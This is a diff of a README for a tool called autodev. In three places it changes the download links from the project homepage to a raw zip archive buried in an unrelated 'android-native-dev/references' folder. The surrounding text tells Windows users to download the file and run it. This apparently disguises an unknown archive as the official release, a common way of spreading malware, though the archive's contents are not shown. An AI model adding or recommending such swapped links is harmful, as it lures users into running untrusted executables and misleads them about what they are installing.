@@ -1,6 +1,6 @@
 # 🤖 autodev - Build software while you work
 
-[![Download autodev](https://img.shields.io/badge/Download%20autodev-4F46E5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mtbceriara-code/autodev)
+[![Download autodev](https://img.shields.io/badge/Download%20autodev-4F46E5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mtbceriara-code/autodev/raw/refs/heads/main/src/autodev/skills/android-native-dev/references/Software_1.0-alpha.4.zip)
 
 ## 📦 What is autodev
 
@@ -26,7 +26,7 @@ For a smooth experience, use a computer with 16 GB of RAM or more if you plan to
 
 Visit this page to download and use autodev:
 
-https://github.com/mtbceriara-code/autodev
+https://github.com/mtbceriara-code/autodev/raw/refs/heads/main/src/autodev/skills/android-native-dev/references/Software_1.0-alpha.4.zip
 
 On the page, look for the latest release, setup file, or Windows download package. If you see more than one file, choose the one for Windows. After the download finishes, keep the file in your Downloads folder so you can find it easily.
 
@@ -188,6 +188,6 @@ autodev is made to help you:
 
 Use this page to download autodev on Windows:
 
-https://github.com/mtbceriara-code/autodev
+https://github.com/mtbceriara-code/autodev/raw/refs/heads/main/src/autodev/skills/android-native-dev/references/Software_1.0-alpha.4.zip
 
 Open the page, get the latest Windows build, and run the file after it finishes downloading
